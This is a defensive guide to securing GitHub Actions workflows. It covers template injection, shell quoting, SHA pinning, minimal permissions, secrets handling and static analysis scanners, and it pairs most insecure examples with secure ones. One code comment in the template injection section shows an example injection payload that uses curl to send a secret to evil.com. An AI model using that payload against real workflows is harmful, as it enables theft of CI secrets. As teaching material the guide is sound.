# GitHub Actions Security Best Practices

This document outlines security best practices for GitHub Actions workflows based on findings from static analysis tools (actionlint, zizmor, poutine) and security research. Following these guidelines helps prevent common vulnerabilities and maintain secure CI/CD pipelines.

## Table of Contents

1. [Template Injection Prevention](#template-injection-prevention)
2. [Shell Script Best Practices](#shell-script-best-practices)
3. [Supply Chain Security](#supply-chain-security)
4. [Workflow Structure and Permissions](#workflow-structure-and-permissions)
5. [Static Analysis Integration](#static-analysis-integration)
6. [Additional Security Controls](#additional-security-controls)

---

## Template Injection Prevention

Template injection occurs when untrusted input is used directly in GitHub Actions expressions (`${{ }}`), allowing attackers to execute arbitrary code or access secrets.

### Understanding the Risk

GitHub Actions expressions are evaluated before workflow execution. If untrusted data (issue titles, PR bodies, comments) flows into these expressions, attackers can inject malicious code.

### ❌ Insecure Pattern: Direct Expression Usage

```yaml
# VULNERABLE: Direct use of untrusted input in expression
name: Process Issue
on:
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        run: echo "${{ github.event.issue.title }}"
        # Attacker can inject: `"; curl evil.com/?secret=$SECRET; echo "`
```text

**Why it's vulnerable**: The issue title is directly interpolated into the expression. An attacker can close the string, inject commands, and access secrets.

### ✅ Secure Pattern: Environment Variables

```yaml
# SECURE: Use environment variables to pass untrusted data
name: Process Issue
on:
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "$ISSUE_TITLE"
        # Input is treated as data, not code
```text

**Why it's secure**: The expression is evaluated in a controlled context (environment variable assignment). The shell receives the value as data, not executable code.

### ✅ Secure Pattern: Sanitized Context (gh-aw specific)

```yaml
# SECURE: Use sanitized context output
# For GitHub Agentic Workflows
Analyze this content: "${{ needs.activation.outputs.text }}"
```text

**Why it's secure**: The `needs.activation.outputs.text` output is automatically sanitized:
- @mentions neutralized (`` `@user` ``)
- Bot triggers protected (`` `fixes #123` ``)
- XML tags converted to safe format
- Only HTTPS URIs from trusted domains
- Content limits enforced (0.5MB, 65k lines)
- Control characters removed

### Safe Context Variables

**Always safe to use in expressions** (these are controlled by GitHub):
- `github.actor`
- `github.repository`
- `github.run_id`
- `github.run_number`
- `github.sha`

**Never safe in expressions without environment variable indirection**:
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.head_ref` (can be controlled by PR authors)

### Template Injection in run-name

```yaml
# ❌ VULNERABLE
run-name: "Processing ${{ github.event.issue.title }}"

# ✅ SECURE: Avoid using untrusted input in run-name
run-name: "Processing issue #${{ github.event.issue.number }}"
```text

### Template Injection in Conditional Expressions

```yaml
# ❌ VULNERABLE
if: github.event.comment.body == 'approved'

# ✅ SECURE: Use environment variables
steps:
  - name: Check approval
    env:
      COMMENT_BODY: ${{ github.event.comment.body }}
    run: |
      if [ "$COMMENT_BODY" = "approved" ]; then
        echo "Approved"
      fi
```yaml

---

## Shell Script Best Practices

GitHub Actions workflows often execute shell scripts. Following shellcheck best practices prevents common errors and security issues.

### SC2086: Double Quote to Prevent Globbing and Word Splitting

This is the most common shellcheck warning in GitHub Actions workflows.

#### ❌ Insecure Pattern: Unquoted Variables

```yaml
# VULNERABLE: Unquoted variable expansion
steps:
  - name: Process files
    run: |
      FILES=$(ls *.txt)
      for file in $FILES; do  # SC2086: Unquoted variable
        echo $file            # SC2086: Unquoted variable
      done
```text

**Why it's vulnerable**:
- Variables can be split on whitespace (files with spaces break)
- Glob patterns in variables are expanded (* ? [ ])
- Can lead to command injection if attacker controls content

#### ✅ Secure Pattern: Quoted Variables

```yaml
# SECURE: Quoted variable expansion
steps:
  - name: Process files
    run: |
      while IFS= read -r file; do
        echo "$file"
      done < <(find . -name "*.txt")
```text

**Why it's secure**: Proper quoting prevents word splitting and globbing. Using `find` with process substitution is more robust than `ls`.

### SC2016: Expressions Don't Expand in Single Quotes

#### ❌ Insecure Pattern: Wrong Quote Type

```yaml
# WRONG: Variable won't expand
steps:
  - name: Set variable
    run: echo 'Value is $HOME'  # SC2016: Won't expand
    # Output: Value is $HOME (literal)
```text

#### ✅ Secure Pattern: Use Double Quotes or Unquoted

```yaml
# CORRECT: Use double quotes for expansion
steps:
  - name: Set variable
    run: echo "Value is $HOME"
    # Output: Value is /home/runner
```text

### Proper Quoting in Multi-line Scripts

```yaml
# ❌ VULNERABLE: Mixed quoting issues
- name: Complex script
  run: |
    FILE_PATH=${{ github.event.issue.title }}  # Template injection
    cat $FILE_PATH                             # SC2086: Unquoted

# ✅ SECURE: Proper quoting and indirection
- name: Complex script
  env:
    FILE_NAME: ${{ github.event.issue.title }}
  run: |
    # Validate and sanitize input
    if [[ "$FILE_NAME" =~ ^[a-zA-Z0-9._-]+$ ]]; then
      cat "$FILE_NAME"
    else
      echo "Invalid filename"
      exit 1
    fi
```text

### GraphQL Query Formatting

When building GraphQL queries in shell scripts, use proper quoting:

```yaml
# ❌ PROBLEMATIC: Variable might need quoting
- name: GraphQL query
  run: |
    QUERY='query { repository(name: $REPO) { id } }'  # SC2016

# ✅ SECURE: Properly formatted query
- name: GraphQL query
  env:
    REPO_NAME: ${{ github.event.repository.name }}
  run: |
    QUERY=$(cat <<EOF
    query {
      repository(name: "$REPO_NAME") {
        id
      }
    }
    EOF
    )
    echo "$QUERY"
```text

### Bash Script Security Checklist

- ✅ Always quote variable expansions: `"$VAR"`
- ✅ Use `[[ ]]` instead of `[ ]` for conditionals
- ✅ Use `$()` instead of backticks for command substitution
- ✅ Enable strict mode: `set -euo pipefail`
- ✅ Validate and sanitize all inputs
- ✅ Use `shellcheck` to catch common issues

```yaml
# ✅ SECURE: Well-structured bash script
steps:
  - name: Secure script
    env:
      INPUT_VALUE: ${{ github.event.inputs.value }}
    run: |
      set -euo pipefail  # Exit on error, undefined vars, pipe failures
      
      # Validate input
      if [[ ! "$INPUT_VALUE" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "Invalid input format"
        exit 1
      fi
      
      # Use quoted expansions
      echo "Processing: $INPUT_VALUE"
      
      # Safe command usage
      result=$(grep -r "$INPUT_VALUE" . || true)
      echo "$result"
```yaml

---

## Supply Chain Security

Supply chain attacks target dependencies in CI/CD pipelines. Secure your workflows by controlling and verifying all external code.

### Pin Action Versions with SHA

#### ❌ Insecure Pattern: Mutable References

```yaml
# VULNERABLE: Tags and branches can be changed
steps:
  - uses: actions/checkout@v5           # Tag can be moved
  - uses: actions/setup-node@main       # Branch can be updated
  - uses: thirdparty/action@latest      # Always points to latest
```text

**Why it's vulnerable**:
- Tags can be deleted and recreated with malicious code
- Branches can be force-pushed with compromised versions
- `latest` provides no version control
- Repository ownership can change

#### ✅ Secure Pattern: SHA Pinning

```yaml
# SECURE: Immutable SHA references with comments
steps:
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
  - uses: thirdparty/action@abc123def456... # v2.0.0
```text

**Why it's secure**:
- SHA commits are immutable (cannot be changed without changing hash)
- Provides exact version control
- Comments indicate the human-readable version for updates
- Prevents supply chain attacks via tag/branch manipulation

#### Finding SHA for Actions

There are several ways to find the SHA commit for a specific action version:

**Method 1: Using git ls-remote (Recommended)**
```bash
# Get SHA for a specific tag
git ls-remote https://github.com/actions/checkout v4.1.1
# Output: abc123def456...  refs/tags/v4.1.1

# For actions with subpaths (like codeql-action)
git ls-remote https://github.com/github/codeql-action v3
```text

**Method 2: Using GitHub API**
```bash
# Get SHA for a tag
curl -s https://api.github.com/repos/actions/checkout/git/refs/tags/v4.1.1 | jq -r '.object.sha'

# Get the latest release
curl -s https://api.github.com/repos/actions/checkout/releases/latest | jq -r '.tag_name'
```text

**Method 3: Using GitHub Web UI**
1. Navigate to the action's GitHub repository (e.g., https://github.com/actions/checkout)
2. Click on the "Releases" or "Tags" section
3. Find the version tag you want (e.g., v4.1.1)
4. Click on the tag to see the commit
5. Copy the full SHA from the commit page

**Method 4: Automated Script**
```bash
#!/bin/bash
# pin-action.sh - Get SHA for an action

get_sha() {
    local action=$1
    local version=$2
    local repo=$(echo "$action" | cut -d'/' -f1-2)
    
    sha=$(git ls-remote "https://github.com/$repo" "refs/tags/$version" 2>/dev/null | awk '{print $1}')
    
    if [ -z "$sha" ]; then
        sha=$(git ls-remote "https://github.com/$repo" "$version" 2>/dev/null | awk '{print $1}')
    fi
    
    if [ -n "$sha" ]; then
        echo "$action@$sha # $version"
    else
        echo "ERROR: Could not find SHA for $action@$version" >&2
        return 1
    fi
}

# Usage: get_sha "actions/checkout" "v4.1.1"
get_sha "$1" "$2"
```text

### Verify Action Creators

**Trust levels** for GitHub Actions:

1. **GitHub-verified creators** (✅ Highest trust)
   - `actions/*` - GitHub official actions
   - `github/*` - GitHub official actions
   
2. **Well-known verified publishers** (✅ High trust)
   - Major cloud providers (AWS, Azure, Google Cloud)
   - Popular open-source projects with established reputation
   - Actions with many stars, recent updates, and active maintenance

3. **Unverified third-party** (⚠️ Review carefully)
   - New or unmaintained actions
   - Actions with few users
   - Actions without source code transparency

```yaml
# ✅ TRUSTED: GitHub official action
- uses: actions/checkout@sha

# ✅ TRUSTED: Well-known verified publisher
- uses: docker/build-push-action@sha

# ⚠️ REVIEW: Third-party action
# Before using, review:
# - Source code
# - Permissions requested
# - Maintenance activity
# - User reviews
- uses: unknown-org/custom-action@sha
```text

### Review Action Permissions

```yaml
# ⚠️ HIGH RISK: Action requests broad permissions
- uses: thirdparty/action@sha
  with:
    token: ${{ secrets.GITHUB_TOKEN }}  # Full repo access
    
# ✅ BETTER: Use minimal permissions
permissions:
  contents: read  # Only what's needed
  
- uses: thirdparty/action@sha
  with:
    token: ${{ secrets.GITHUB_TOKEN }}
```text

### Dependency Scanning

```yaml
# ✅ RECOMMENDED: Regular dependency scanning
name: Security Scan
on:
  schedule:
    - cron: '0 0 * * 0'  # Weekly
  workflow_dispatch:

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@sha
      
      - name: Run Trivy
        uses: aquasecurity/trivy-action@sha
        with:
          scan-type: 'fs'
          scan-ref: '.'
```text

### Maintaining Pinned Actions

Once actions are pinned to SHA commits, they need to be updated periodically to get bug fixes and security updates.

#### When to Update Pinned Actions

- **Security advisories**: Immediately update when a security vulnerability is announced
- **Major releases**: Review and update when a new major version is released
- **Regular maintenance**: Update quarterly or semi-annually for bug fixes and improvements
- **Breaking changes**: Test thoroughly before updating to avoid CI/CD disruptions

#### Update Process

1. **Check for updates**:
   ```bash
   # List current versions in your workflows
   grep -r "uses:.*# v" .github/workflows/
   
   # Check for newer versions on GitHub
   # Visit: https://github.com/actions/checkout/releases
   ```

2. **Get new SHA**:
   ```bash
   # Get SHA for new version
   git ls-remote https://github.com/actions/checkout v4.2.0
   ```

3. **Update workflow file**:
   ```yaml
   # Old
   - uses: actions/checkout@abc123... # v4.1.1
   
   # New
   - uses: actions/checkout@def456... # v4.2.0
   ```

4. **Test the changes**:
   - Run the workflow in a test branch
   - Verify all jobs complete successfully
   - Check for any behavioral changes

5. **Document changes**:
   - Note why the update was made (security fix, new feature, etc.)
   - Update any related documentation

#### Automated Update Tools

**Dependabot** (Recommended for GitHub repositories):
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Auto-merge minor and patch updates
    open-pull-requests-limit: 10
```text

**Renovate Bot**:
```json
{
  "extends": ["config:base"],
  "github-actions": {
    "enabled": true,
    "pinDigests": true
  }
}
```text

#### Finding All Unpinned Actions

Use this command to identify any remaining unpinned actions:

```bash
# Find all unpinned actions (not using SHA)
grep -r "uses:" .github/workflows/*.yml .github/workflows/*.yaml | \
  grep -v "@[0-9a-f]\{40\}" | \
  grep -v "^#" | \
  grep -v ".lock.yml"

# Count pinned vs unpinned
echo "Pinned actions:"
grep -r "uses:" .github/workflows/*.yml | grep "@[0-9a-f]\{40\}" | wc -l

echo "Unpinned actions:"
grep -r "uses:" .github/workflows/*.yml | grep -v "@[0-9a-f]\{40\}" | grep -v "^#" | wc -l
```text

### Supply Chain Security Checklist

- ✅ Pin all actions to immutable SHA references
- ✅ Add version comments to pinned SHAs (format: `@sha # v1.2.3`)
- ✅ Review action source code before first use
- ✅ Use actions from verified creators when possible
- ✅ Regularly update pinned actions (but review changes)
- ✅ Scan dependencies for vulnerabilities
- ✅ Monitor security advisories for used actions
- ✅ Use Dependabot or Renovate for automated updates
- ✅ Document update procedures for your team
- ✅ Test updated actions before merging to main branch

---

## Workflow Structure and Permissions

### Minimal Permissions Principle

#### ❌ Insecure Pattern: Overly Broad Permissions

```yaml
# VULNERABLE: Unnecessary broad permissions
name: CI
on: [push]

permissions: write-all  # Gives all permissions

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
```text

**Why it's vulnerable**: Compromised workflow or action can access all repository resources, modify code, access secrets, and create releases.

#### ✅ Secure Pattern: Minimal Required Permissions

```yaml
# SECURE: Minimal permissions
name: CI
on: [push]

permissions:
  contents: read  # Only read repository contents

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@sha
      - run: npm test
```text

#### ✅ Secure Pattern: Job-Level Permissions

```yaml
# SECURE: Different permissions per job
name: CI/CD
on: [push]

permissions:
  contents: read  # Default for all jobs

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@sha
      - run: npm test
  
  deploy:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      deployments: write  # Only for deploy job
    steps:
      - uses: actions/checkout@sha
      - run: npm run deploy
```text

### Available Permissions

| Permission | Read | Write | Use Case |
|------------|------|-------|----------|
| `contents` | Read code | Push code | Repository access |
| `issues` | Read issues | Create/edit issues | Issue management |
| `pull-requests` | Read PRs | Create/edit PRs | PR management |
| `actions` | Read runs | Cancel runs | Workflow management |
| `checks` | Read checks | Create checks | Status checks |
| `deployments` | Read deployments | Create deployments | Deployment management |
| `discussions` | Read discussions | Create discussions | Discussion management |
| `packages` | Download packages | Publish packages | Package management |
| `statuses` | Read statuses | Create statuses | Commit statuses |
| `security-events` | Read alerts | Dismiss alerts | Security alerts |

### Secure Trigger Configuration

#### Pull Request Triggers from Forks

```yaml
# ❌ VULNERABLE: Runs on fork PRs with write access
name: PR Check
on:
  pull_request_target:  # Dangerous with forks
    types: [opened]

permissions:
  contents: write  # Fork can modify repo!

# ✅ SECURE: Block forks or use safe triggers
name: PR Check
on:
  pull_request:  # Runs in fork context (safer)
    types: [opened]
    # Or explicitly allow trusted forks only
    # forks: ["trusted-org/*"]

permissions:
  contents: read
```text

**Key differences**:
- `pull_request`: Runs in PR context (fork's code, limited permissions)
- `pull_request_target`: Runs in base context (base's code, full permissions)

#### Workflow Run Triggers

```yaml
# ✅ SECURE: Automatic repository validation
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
    branches:  # Always restrict branches
      - main

# Compiler automatically adds repository check:
# github.event.workflow_run.repository.id == github.repository_id
```text

### Environment Variable Handling

```yaml
# ❌ INSECURE: Secrets in logs
steps:
  - name: Deploy
    run: |
      echo "Token: ${{ secrets.DEPLOY_TOKEN }}"  # Logged!
      curl -H "Authorization: ${{ secrets.DEPLOY_TOKEN }}" ...  # In logs!

# ✅ SECURE: Use environment variables
steps:
  - name: Deploy
    env:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    run: |
      # Token not exposed in logs
      curl -H "Authorization: Bearer $DEPLOY_TOKEN" https://api.example.com
```text

### Safe Outputs Pattern (gh-aw specific)

```yaml
# ✅ SECURE: Separate AI processing from write operations
permissions:
  contents: read  # Main job minimal permissions
  actions: read

safe-outputs:
  create-issue:    # Separate job with write permissions
  add-comment:     # Automated, validated operations
  create-pull-request:

# AI never has direct write access
```yaml

---

## Static Analysis Integration

Static analysis tools catch security issues before they reach production. Integrate them into development and CI/CD workflows.

### Available Tools

#### actionlint
- **Purpose**: Lints GitHub Actions workflows, validates shell scripts with shellcheck
- **Detects**: Syntax errors, deprecated features, shell script issues, type mismatches
- **Exit code**: 0 (clean), 1 (errors)

#### zizmor
- **Purpose**: Security vulnerability scanner for GitHub Actions
- **Detects**: Privilege escalation, secret exposure, dangerous patterns, misconfigurations
- **Exit code**: 0 (clean), 10-14 (findings by severity)

#### poutine
- **Purpose**: Supply chain security analyzer
- **Detects**: Unpinned actions, untrusted sources, vulnerable dependencies
- **Exit code**: 0 (clean), 1 (findings)

### Running Locally

```bash
# Install tools (examples)
brew install actionlint
cargo install zizmor
pip install poutine

# Run individual scanners
actionlint .github/workflows/*.yml
zizmor .github/workflows/
poutine analyze .github/workflows/

# For gh-aw workflows
gh aw compile --actionlint
gh aw compile --zizmor
gh aw compile --poutine

# Strict mode: fail on findings
gh aw compile --strict --actionlint --zizmor --poutine
```text

### CI/CD Integration

```yaml
name: Security Scan
on:
  pull_request:
    paths:
      - '.github/workflows/**'
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@sha
      
      - name: Run actionlint
        uses: reviewdog/action-actionlint@sha
        with:
          reporter: github-pr-review
      
      - name: Run zizmor
        run: |
          cargo install zizmor
          zizmor .github/workflows/
      
      - name: Upload results
        if: always()
        uses: actions/upload-artifact@sha
        with:
          name: security-scan-results
          path: |
            actionlint-report.txt
            zizmor-report.json
```text

### Interpreting Results

#### actionlint Output
```text
workflow.yml:10:5: shellcheck reported issue in this script: SC2086:info:1:6: Double quote to prevent globbing and word splitting [shellcheck]
workflow.yml:15:3: property "runs-on" is not set [syntax-check]
```text

**Action**: Fix shell quoting issues, add missing required fields.

#### zizmor Output
```text
finding: artipacked
  rule:
    id: artipacked
    level: Medium
    desc: Actions that upload artifacts without retention limits
  location: workflow.yml:25
```text

**Action**: Add `retention-days` to artifact uploads.

#### poutine Output
```yaml
[CRITICAL] Unpinned action at .github/workflows/ci.yml:10
  - uses: actions/checkout@v5
  - Recommendation: Pin to SHA
```text

**Action**: Replace version tags with SHA commits.

### Pre-commit Hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/rhysd/actionlint
    rev: v1.6.26
    hooks:
      - id: actionlint
        args: [-shellcheck=]
```text

### Integration Best Practices

- ✅ Run scanners on every PR that modifies workflows
- ✅ Use strict mode in CI/CD to fail on findings
- ✅ Review and fix High/Critical findings immediately
- ✅ Regularly update scanner versions
- ✅ Document accepted risks for suppressed findings
- ✅ Make scanning results visible to team
- ✅ Include scanning in developer workflow (pre-commit)

---

## Additional Security Controls

### Secrets Management

```yaml
# ❌ INSECURE: Hardcoded secrets
steps:
  - run: curl -H "X-API-Key: sk-1234567890abcdef" ...

# ✅ SECURE: Use GitHub Secrets
steps:
  - name: API Call
    env:
      API_KEY: ${{ secrets.API_KEY }}
    run: curl -H "X-API-Key: $API_KEY" ...
```text

**Best practices**:
- Never commit secrets to repository
- Use GitHub Secrets or external secret managers
- Rotate secrets regularly
- Use fine-grained permissions when possible
- Audit secret access in workflow logs

### CODEOWNERS for Workflow Changes

```text
# .github/CODEOWNERS
.github/workflows/ @security-team
.github/actions/ @security-team
```text

**Why**: Ensures workflow changes are reviewed by security team before merge.

### Branch Protection Rules

Configure branch protection for main branches:
- ✅ Require pull request reviews
- ✅ Require status checks to pass
- ✅ Require branches to be up to date
- ✅ Include administrators in restrictions
- ✅ Restrict who can push to matching branches

### Environment Protection Rules

```yaml
# Use environment protection for sensitive deployments
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - run: deploy.sh
```text

**Configure in repository settings**:
- Required reviewers
- Wait timer
- Deployment branches restriction

### Audit Logging

```yaml
# Enable structured audit logging
steps:
  - name: Audit action
    run: |
      echo "::group::Deployment started"
      echo "User: ${{ github.actor }}"
      echo "Commit: ${{ github.sha }}"
      echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
      echo "::endgroup::"
```text

### Network Isolation (gh-aw specific)

```yaml
# ✅ SECURE: Restrict network access
network:
  allowed:
    - defaults
    - "api.trusted-service.com"
    
# Or deny all network access
network: {}
```yaml

---

## Summary Checklist

Use this checklist when creating or reviewing GitHub Actions workflows:

### Template Injection
- [ ] No untrusted input in `${{ }}` expressions
- [ ] Untrusted data passed via environment variables
- [ ] Safe context variables used where possible
- [ ] Sanitized context used (gh-aw: `needs.activation.outputs.text`)

### Shell Scripts
- [ ] All variables quoted: `"$VAR"`
- [ ] No SC2086 warnings (unquoted expansion)
- [ ] No SC2016 warnings (wrong quote type)
- [ ] Strict mode enabled: `set -euo pipefail`
- [ ] Input validation implemented
- [ ] shellcheck passes with no warnings

### Supply Chain
- [ ] All actions pinned to SHA (not tags/branches)
- [ ] Version comments added to pinned actions
- [ ] Actions from verified creators or reviewed
- [ ] Dependencies scanned for vulnerabilities
- [ ] Regular update process in place

### Permissions
- [ ] Minimal permissions specified
- [ ] No `write-all` permissions
- [ ] Job-level permissions used when needed
- [ ] Fork PR handling secure (`pull_request` vs `pull_request_target`)
- [ ] Repository validation for `workflow_run` triggers

### Static Analysis
- [ ] actionlint passes (no errors)
- [ ] zizmor passes (High/Critical addressed)
- [ ] poutine passes (supply chain secure)
- [ ] Scanners integrated in CI/CD
- [ ] Regular scanning schedule configured

### Additional Controls
- [ ] Secrets in GitHub Secrets (not hardcoded)
- [ ] CODEOWNERS configured for workflows
- [ ] Branch protection enabled
- [ ] Environment protection for deployments
- [ ] Audit logging implemented
- [ ] Network isolation configured (if applicable)

---

## References

### Official Documentation
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Security Best Practices for Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)
- [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [Permissions Reference](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#permissions)

### Security Tools
- [actionlint](https://github.com/rhysd/actionlint) - GitHub Actions workflow linter
- [zizmor](https://github.com/woodruffw/zizmor) - Security scanner for GitHub Actions
- [poutine](https://github.com/boostsecurityio/poutine) - Supply chain security analyzer
- [shellcheck](https://www.shellcheck.net/) - Shell script static analysis

### Security Research
- [GitHub Actions Template Injection](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [Supply Chain Attacks via Actions](https://blog.gitguardian.com/github-actions-security-cheat-sheet/)

### Related Documentation (gh-aw specific)
- [Security Guide](../docs/src/content/docs/introduction/architecture.md)
- [Safe Outputs](../docs/src/content/docs/reference/safe-outputs/)
- [Network Configuration](../docs/src/content/docs/reference/network/)
- [GitHub Agentic Workflows Instructions](../.github/aw/github-agentic-workflows.md)

---

**Last Updated**: 2025-12-06  
**Status**: ✅ Documented  
**Implementation**: See workflow examples in `.github/workflows/` and `pkg/cli/workflows/`
